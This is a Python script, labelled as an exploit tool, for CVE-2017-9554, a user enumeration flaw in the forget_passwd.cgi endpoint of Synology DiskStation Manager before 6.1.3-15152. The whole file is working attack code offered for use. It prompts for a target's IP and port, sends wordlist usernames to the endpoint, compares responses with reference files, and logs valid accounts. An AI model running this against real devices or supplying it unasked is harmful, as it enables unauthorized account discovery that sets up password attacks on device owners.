import requests
import os
import filecmp

print("Synology DiskStation Manager (DSM) < 6.1.3-15152 - 'forget_passwd.cgi' User Enumeration EXPLOIT Tool\n# Date: 01/05/2018\n# Exploit Author: Steve Kaun\n# Vendor Homepage: https://www.synology.com\n# Version: Before 6.1.3-15152\n# CVE : CVE-2017-9554")
print("(Press ENTER to continue)")
wait = input()

IP = input("\nIP adress of the target : ")
PORT = input("\nPort of the target : ")

print("\nWhich file do you want?\n\n 1 - Wordlist 1\n 2 - Wordlist 2\n 3 - An other file (need to be a .txt file and in the same folder as the script)\n")
choice = input("CHOICE (type a number) : ")

if choice == "1":
    print("Wordlist 1 selected.\n")
    filechoice = "wordlist1.txt"
elif choice == "2":
    print("Wordlist 2 selected.\n")
    filechoice = "wordlist2.txt"
elif choice ==  "3":
    print("An other file selected.\n")
    filechoice = input("File name : ")
else:
    print("Please select a correct entry !")

file1 = open(filechoice, 'r')
Lines = file1.readlines()
for line in Lines:
    url = ("http://"+IP+":"+PORT+"/webman/forget_passwd.cgi?user="+line.strip())
    data = requests.get(url)
    text = data.text

    f = open("text.txt", "w")
    f.write(text)
    f.close()

    f1 = "ref.txt"
    f2 = "ref2.txt"
    f3 = "text.txt"

    result = filecmp.cmp(f1, f3)
    result2 = filecmp.cmp(f2, f3)
    
    if result == False and result2 == False:
        print("USERNAME FOUND! :", str(line.strip()),":", str(url))
        win = open("win.txt", "a")
        win.write(text + line.strip())
        win.close()
    else:
        print("WRONG :",str(line.strip()),":",str(url))
